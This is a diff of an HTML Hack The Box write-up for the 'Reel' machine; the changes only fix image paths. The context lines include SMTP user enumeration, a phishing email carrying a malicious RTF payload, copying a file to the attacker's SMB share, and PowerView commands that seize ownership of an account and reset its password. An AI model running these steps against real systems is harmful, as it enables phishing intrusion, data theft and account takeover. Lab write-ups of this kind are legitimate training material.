@@ -238,7 +238,7 @@ Shared Doc                      : No
 Hyperlinks Changed              : No
 App Version                     : 14.0000
     2 image files read
-</code></pre><p><img src=./images/1.png></p><ul><li><code>smtp</code><ul><li>We can do it via <code>nmap</code></li><li>Or <code>smtp-user-enum</code></li></ul></li></ul><pre tabindex=0><code>└─$ nmap -Pn --script smtp-enum* -p25 10.10.10.77
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/windows/reel/images/1.png></p><ul><li><code>smtp</code><ul><li>We can do it via <code>nmap</code></li><li>Or <code>smtp-user-enum</code></li></ul></li></ul><pre tabindex=0><code>└─$ nmap -Pn --script smtp-enum* -p25 10.10.10.77
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 18:51 BST
 Nmap scan report for 10.10.10.77 (10.10.10.77)
 Host is up (0.092s latency).
@@ -267,7 +267,7 @@ Saved as: payload.hta
 Generating normal RTF payload.
 
 Generated document.rtf successfully
-</code></pre><ul><li>Let&rsquo;s send email<ul><li><code>swaks --to nico@megabank.com --from pentest@megabank.com --header "Subject: Document Review" --body 'Sending the document for review before sending it to the clients.' --server 10.10.10.77 --attach document.rtf</code></li></ul></li></ul><p><img src=./images/2.png></p><ul><li>After few minutes, we have a connection</li></ul><p><img src=./images/3.png></p><h2 id=user-1>User #1</h2><ul><li><code>whoami</code></li></ul><pre tabindex=0><code>C:\Windows\system32&gt;whoami
+</code></pre><ul><li>Let&rsquo;s send email<ul><li><code>swaks --to nico@megabank.com --from pentest@megabank.com --header "Subject: Document Review" --body 'Sending the document for review before sending it to the clients.' --server 10.10.10.77 --attach document.rtf</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/reel/images/2.png></p><ul><li>After few minutes, we have a connection</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/reel/images/3.png></p><h2 id=user-1>User #1</h2><ul><li><code>whoami</code></li></ul><pre tabindex=0><code>C:\Windows\system32&gt;whoami
 whoami
 htb\nico
 
@@ -401,7 +401,7 @@ tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound&gt;dir Ingestors
 This program is blocked by group policy. For more information, contact your system administrator.
 </code></pre><ul><li>So let&rsquo;s download the <code>acls.csv</code></li></ul><pre tabindex=0><code>tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors&gt;copy acls.csv \\10.10.16.9\share                                    
         1 file(s) copied.                                                                                                       
-</code></pre><p><img src=./images/4.png></p><ul><li><code>tom</code> has <code>WriteOwner</code> over <code>claire</code><ul><li><code>claire</code> has <code>WriteDacl</code> over <code>Backup_Admins</code></li><li>So let&rsquo;s get <code>claire</code><ul><li><a href=https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner target=_blank rel=noopener>https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner</a></li></ul></li></ul></li></ul><p><img src=./images/5.png></p><p><img src=./images/6.png></p><ul><li>Let&rsquo;s change the owner <code>claire</code> and then reset her password</li></ul><pre tabindex=0><code>PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; import-module .\Powerview.ps1                                                      
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/windows/reel/images/4.png></p><ul><li><code>tom</code> has <code>WriteOwner</code> over <code>claire</code><ul><li><code>claire</code> has <code>WriteDacl</code> over <code>Backup_Admins</code></li><li>So let&rsquo;s get <code>claire</code><ul><li><a href=https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner target=_blank rel=noopener>https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner</a></li></ul></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/reel/images/5.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/reel/images/6.png></p><ul><li>Let&rsquo;s change the owner <code>claire</code> and then reset her password</li></ul><pre tabindex=0><code>PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; import-module .\Powerview.ps1                                                      
 PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Set-DomainObjectOwner -identity claire -OwnerIdentity tom                          
 PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
 PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; $cred = ConvertTo-SecureString &#34;P@ssw0rd!&#34; -AsPlainText -force                     
